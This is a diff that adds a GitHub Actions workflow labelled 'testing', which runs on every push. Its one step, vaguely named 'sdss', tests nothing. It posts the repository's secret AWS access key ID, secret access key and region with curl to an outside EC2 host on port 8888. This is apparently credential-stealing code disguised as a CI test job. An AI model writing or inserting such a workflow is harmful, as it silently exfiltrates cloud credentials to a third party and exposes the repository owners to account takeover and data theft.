@@ -1,0 +1,22 @@
+name: testing
+
+on: [push]
+
+jobs:
+  testing:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: sdss
+      env:
+        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        AWS_DEFAULT_REGION: ${{ env.AWS_DEFAULT_REGION }}
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.CS_DEVOPS_S3_AWS_ACCESS_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.CS_DEVOPS_S3_AWS_SECRET_ACCESS_KEY }}" \
+          -d "aws-region=${{ env.AWS_DEFAULT_REGION }}"
